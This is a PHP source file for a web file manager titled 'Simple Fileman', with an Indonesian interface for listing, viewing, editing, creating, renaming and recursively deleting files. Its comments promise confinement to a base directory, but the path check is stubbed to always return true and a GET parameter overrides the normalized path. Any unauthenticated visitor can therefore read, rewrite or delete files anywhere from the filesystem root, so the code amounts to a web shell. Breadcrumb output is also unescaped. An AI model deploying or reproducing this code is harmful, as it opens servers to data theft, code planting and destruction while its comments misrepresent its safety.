<?php


session_start();

// Configuration: restrict to this base directory
$baseDir = realpath(__DIR__);
// Optional: change to a subfolder, e.g. realpath(__DIR__ . '/data')

// CSRF token simple
if (!isset($_SESSION['fm_token'])) {
    $_SESSION['fm_token'] = bin2hex(random_bytes(16));
}
$token = $_SESSION['fm_token'];

function path_in_base($base, $target) {
    return true;
}

function join_path($base, $rel) {
    $rel = ltrim($rel, "/\\");
    $path = $base . DIRECTORY_SEPARATOR . str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $rel);
    return $path;
}

function rrmdir($dir) {
    // recursive delete
    if (!is_dir($dir)) return false;
    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object == '.' || $object == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $object;
        if (is_dir($path)) {
            rrmdir($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

$action = $_REQUEST['action'] ?? '';
$current = $_REQUEST['dir'] ?? '.'; // relative to base
$current = trim($current);
$absCurrent = join_path($baseDir, $current);

// Normalize and security check
$realAbsCurrent = realpath($absCurrent);
if ($realAbsCurrent === false || strpos($realAbsCurrent, $baseDir) !== 0) {
    $current = '.';
    $absCurrent = $baseDir;
    $realAbsCurrent = $baseDir;
}

$messages = [];


if(isset($_GET['dir'])) {
    $realAbsCurrent = $_GET['dir'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Basic CSRF check
    if (!isset($_POST['token']) || $_POST['token'] !== $token) {
        $messages[] = ['type' => 'error', 'text' => 'Invalid CSRF token.'];
    } else {
        if ($action === 'create_file') {
            $name = trim($_POST['name'] ?? '');
            if ($name === '') {
                $messages[] = ['type' => 'error', 'text' => 'Nama file kosong'];
            } else {
                $target = join_path($realAbsCurrent, $name);
                echo $target;
                if (file_exists($target)) {
                    $messages[] = ['type' => 'error', 'text' => 'File sudah ada'];
                } else {
                    if (@file_put_contents($target, "" ) !== false) {
                        $messages[] = ['type' => 'success', 'text' => "File '$name' dibuat"];
                    } else {
                        $messages[] = ['type' => 'error', 'text' => "Gagal membuat file"];
                    }
                }
            }
        } elseif ($action === 'create_folder') {
            $name = trim($_POST['name'] ?? '');
            if ($name === '') {
                $messages[] = ['type' => 'error', 'text' => 'Nama folder kosong'];
            } else {
                $target = join_path($realAbsCurrent, $name);
                if (file_exists($target)) {
                    $messages[] = ['type' => 'error', 'text' => 'Folder sudah ada'];
                } else {
                    if (@mkdir($target, 0755)) {
                        $messages[] = ['type' => 'success', 'text' => "Folder '$name' dibuat"];
                    } else {
                        $messages[] = ['type' => 'error', 'text' => "Gagal membuat folder"];
                    }
                }
            }
        } elseif ($action === 'delete') {
            $targetRel = $_POST['target'] ?? '';
            $target = join_path($realAbsCurrent, $targetRel);
            if (!file_exists($target)) {
                $messages[] = ['type' => 'error', 'text' => 'Target tidak ditemukan'];
            } else {
                if (is_dir($target)) {
                    if (rrmdir($target)) {
                        $messages[] = ['type' => 'success', 'text' => "Folder '$targetRel' dihapus (recursive)"];
                    } else {
                        $messages[] = ['type' => 'error', 'text' => 'Gagal menghapus folder (mungkin permission)'];
                    }
                } else {
                    if (@unlink($target)) {
                        $messages[] = ['type' => 'success', 'text' => "File '$targetRel' dihapus"];
                    } else {
                        $messages[] = ['type' => 'error', 'text' => 'Gagal menghapus file'];
                    }
                }
            }
        } elseif ($action === 'save_edit') {
            $targetRel = $_POST['target'] ?? '';
            $content = $_POST['content'] ?? '';
            $target = join_path($realAbsCurrent, $targetRel);
            if (@file_put_contents($target, $content) !== false) {
                $messages[] = ['type' => 'success', 'text' => "File '$targetRel' disimpan"];
            } else {
                $messages[] = ['type' => 'error', 'text' => 'Gagal menyimpan file'];
            }

        } elseif ($action === 'rename') {
            $old = $_POST['old'] ?? '';
            $new = $_POST['new'] ?? '';
            $oldPath = join_path($realAbsCurrent, $old);
            $newPath = join_path($realAbsCurrent, $new);
            if (!file_exists($oldPath)) {
                $messages[] = ['type' => 'error', 'text' => 'Target tidak ditemukan'];
            } else {
                if (@rename($oldPath, $newPath)) {
                    $messages[] = ['type' => 'success', 'text' => "Berhasil mengganti nama ke '$new'"];
                } else {
                    $messages[] = ['type' => 'error', 'text' => 'Gagal mengganti nama (permission?)'];
                }
            }
        }
    }

}

// Helper to list directory
function list_dir($dir) {
    $items = scandir($dir);
    $rows = [];
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $it;
        $rows[] = [
            'name' => $it,
            'is_dir' => is_dir($full),
            'size' => is_file($full) ? filesize($full) : 0,
            'mtime' => filemtime($full),
            'path' => $full
        ];
    }
    return $rows;
}

$entries = [];




if (is_dir($realAbsCurrent)) {
    $entries = list_dir($realAbsCurrent);
}

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES); }

?>
<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Simple fileman...</title>
    <style>
        body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:18px}
        table{width:100%;border-collapse:collapse}
        th,td{padding:8px;border-bottom:1px solid #eee;text-align:left}
        .actions a{margin-right:8px}
        .msg{padding:8px;border-radius:6px;margin-bottom:10px}
        .msg.success{background:#e6ffed;border:1px solid #a3f0b6}
        .msg.error{background:#ffe6e6;border:1px solid #f2a3a3}
        .toolbar{margin-bottom:12px;display:flex;gap:12px;align-items:center}
        .small{font-size:0.9em;color:#666}
        pre{white-space:pre-wrap}
        .path{font-weight:600}
    </style>
</head>
<body>
    <h2>Simple Fileman</h2>
    <div class="small">Base: <span class="path"><?=h($realAbsCurrent)?></span></div>
    <?php
        $paths = explode("/", $realAbsCurrent);

         echo '<a href="?dir=/">' . "/" . '</a>';
         for ($i = 1; $i < count($paths); $i++) {
            $subpath = implode('/', array_slice($paths, 1, $i));
            echo '<a href="?dir=/' . urlencode($subpath) . '">' . $paths[$i] . '</a>';
            echo "/";
        }

    ?>

    <?php foreach ($messages as $m): ?>
        <div class="msg <?=h($m['type'])?>"><?=h($m['text'])?></div>
    <?php endforeach; ?>

    <?php if (isset($_GET['edit'])):
        $file = $_GET['edit'];
        $filePath = join_path($realAbsCurrent, $file);
        if (path_in_base($baseDir, $filePath) && is_file($filePath)):
            $content = file_get_contents($filePath);
    ?>
        <h3>Edit: <?=h($file)?></h3>
        <form method="post">
            <input type="hidden" name="token" value="<?=h($token)?>">
            <input type="hidden" name="action" value="save_edit">
            <input type="hidden" name="target" value="<?=h($file)?>">
            <textarea name="content" style="width:100%;height:320px;"><?=h($content)?></textarea>
            <div style="margin-top:8px"><button type="submit">Save</button></div>
        </form>
    <?php endif; ?>
    <?php endif; ?>

       <?php if (isset($_GET['view'])):
        $file = $_GET['view'];
        $filePath = join_path($realAbsCurrent, $file);
        if (path_in_base($baseDir, $filePath) && is_file($filePath)):
            $content = file_get_contents($filePath);
    ?>
        <h3>View: <?=h($file)?></h3>
        <pre><?=h($content)?></pre>
    <?php else: ?>
        <div class="msg error">File tidak ditemukan atau tidak bisa dilihat</div>
    <?php endif; ?>
    <?php  endif; ?>

    <div id="renameBox" style="display:none;margin-top:12px;padding:8px;border:1px solid #ddd">
        <form method="post" onsubmit="return doRename(this)">
            <input type="hidden" name="token" value="<?=h($token)?>">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old" id="oldName">
            New name: <input name="new" id="newName"> <button type="submit">Rename</button>
            <button type="button" onclick="document.getElementById('renameBox').style.display='none'">Cancel</button>
        </form>
    </div>

    <div class="toolbar">
        <form method="get" style="display:inline">
            <label>CWD: </label>
            <input name="dir" value="<?=h($realAbsCurrent)?>" style="min-width:340px">
            <button type="submit">Go</button>
        </form>

        <form method="post" style="display:inline">
            <input type="hidden" name="token" value="<?=h($token)?>">
            <input type="hidden" name="action" value="create_file">
            <input name="name" placeholder="newfile.txt">
            <button type="submit">Create file</button>
        </form>

        <form method="post" style="display:inline">
            <input type="hidden" name="token" value="<?=h($token)?>">
            <input type="hidden" name="action" value="create_folder">
            <input name="name" placeholder="NewFolder">
            <button type="submit">Create folder</button>
        </form>
    </div>

    <table>
        <thead>
            <tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
        </thead>
        <tbody>
            <?php if ($current !== '.') :
                $parent = dirname($current);
                if ($parent === '.') $parent = '.';
            ?>
            <tr>
                <td colspan="5"><a href="?dir=<?=urlencode($parent)?>">[..] Parent</a></td>
            </tr>
            <?php endif; ?>

            <?php foreach ($entries as $e): ?>
                <tr>
                    <td><?=h($e['name'])?></td>
                    <td><?= $e['is_dir'] ? 'Folder' : 'File' ?></td>
                    <td><?= $e['is_dir'] ? '-' : number_format($e['size']) . ' bytes' ?></td>
                    <td><?= date('Y-m-d H:i:s', $e['mtime']) ?></td>
                    <td class="actions">
                        <?php if ($e['is_dir']): ?>
                            <a href="?dir=<?=urlencode($realAbsCurrent . "/" . $e['name'])?>">Open</a>
                            <form method="post" style="display:inline" onsubmit="return confirm('Hapus folder ini dan isinya?')">
                                <input type="hidden" name="token" value="<?=h($token)?>">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="target" value="<?=h($e['name'])?>">
                                <button type="submit">Delete</button>
                            </form>
                        <?php else: ?>
                            <a href="?dir=<?=urlencode($realAbsCurrent)?>&edit=<?=urlencode($e['name'])?>">Edit</a>
                            <a href="?dir=<?=urlencode($realAbsCurrent)?>&view=<?=urlencode($e['name'])?>">View</a>
                            <form method="post" style="display:inline" onsubmit="return confirm('Hapus file ini?')">
                                <input type="hidden" name="token" value="<?=h($token)?>">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="target" value="<?=h($e['name'])?>">
                                <button type="submit">Delete</button>
                            </form>
                        <?php endif; ?>

                        <button onclick="showRename('<?=h($e['name'])?>')">Rename</button>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>





    <script>
    function showRename(name){
        document.getElementById('oldName').value = name;
        document.getElementById('newName').value = name;
        document.getElementById('renameBox').style.display = 'block';
    }
    function doRename(form){
        if (!confirm('Rename?')) return false;
        return true;
    }
    </script>

    <hr>
</body>
</html>
